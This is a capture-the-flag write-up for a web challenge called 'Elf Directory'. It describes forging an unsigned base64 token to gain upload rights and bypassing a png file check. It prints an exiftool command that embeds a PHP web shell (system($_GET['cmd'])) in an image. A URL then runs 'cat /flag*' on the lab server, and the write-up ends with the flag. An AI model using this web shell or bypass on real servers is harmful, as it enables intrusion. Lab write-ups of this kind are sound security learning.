# Cyber Santa – Elf Directory

- **Category:** Web
- **Points:** 300
- **Difficulty:** ★☆☆☆

## Disclaimer: I did not solve this challenge during the competition.

## Challenge

A website with a simple register/login as well as profile page. No source code was given.

On logging in, we can see that there is supposed to be an `upload` function but it is not visible at the moment and will probably only be visible if we manage to privilege escalate to admin

## Solution

- JWT Token was Base 64 Encoded to `eyJ1c2VybmFtZSI6ImEiLCJhcHByb3ZlZCI6ZmFsc2V9`
  - Decoded Base64 was `{"username":"a","approved":false}`
  - Changing the approved to `true` showed the `upload` button that could change the profile picture
- The upload function only allowed `.png` files to be uploaded.
- On upload, profile photo is changed and a new file path of `/uploads/${5 random hex characters}_filename.png` is created on the server
- Only `.png` files are recognized. Even `.jpg` files that are renamed to `.png` don't work but the `.png` files renamed to other extensions work
- It seems that the file is actually scanned to be a `.png` file. Adding the 8 magic bytes of `.png` was insufficient, but copying around 20+ bytes of a `.png` file seems to bypass this scan
- I couldn't get the reverse shell to work
- I used `exiftool` to embed a `php` script in the comment

using this command

```
exiftool 1.png -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>'
```

and was thus able to achieve RCE and get the flag using the following URL.

```
http://178.62.5.61:31865/uploads/8817b_1.png.php?cmd=cat%20/flag*
```

```
HTB{br4k3_au7hs_g3t_5h3lls}
```

## Thoughts

- This was a quite the learning experience
- Learning how to fool a file checker, tried using `ngrok` and `nc` to listen and trying to embed reverse-shells
- Using the meta data of an image to achieve RCE
